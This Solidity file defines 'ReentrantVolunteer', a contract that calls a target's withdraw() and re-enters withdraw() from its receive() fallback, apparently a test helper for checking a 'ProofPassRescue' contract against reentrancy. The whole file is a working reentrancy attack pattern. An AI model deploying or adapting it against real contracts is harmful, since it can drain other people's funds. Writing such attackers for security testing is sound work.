// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IProofPassRescue {
    function withdraw() external;
    function confirmPickup(bytes32 id) external;
}

contract ReentrantVolunteer {
    IProofPassRescue public immutable target;
    bool public attack;

    constructor(address target_) { target = IProofPassRescue(target_); }
    function pickup(bytes32 id) external { target.confirmPickup(id); }
    function withdraw() external { attack = true; target.withdraw(); attack = false; }
    receive() external payable { if (attack) target.withdraw(); }
}
